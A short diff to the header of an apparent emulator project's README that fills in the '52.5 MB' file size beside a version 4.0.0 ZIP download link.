@@ -17,7 +17,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/premohq/PS5CEMU-HAR/raw/releases/PS5CEMU-HAR-v4.0.0.zip"><b>Download 4.0.0</b></a> (ZIP, @SIZE@ MB) ·
+  <a href="https://github.com/premohq/PS5CEMU-HAR/raw/releases/PS5CEMU-HAR-v4.0.0.zip"><b>Download 4.0.0</b></a> (ZIP, 52.5 MB) ·
   <a href="https://github.com/premohq/PS5CEMU-HAR/releases/tag/v4.0.0">Release notes</a> ·
   <a href="#install">Install</a> ·
   <a href="docs/GUIDE.md">Guide</a> ·
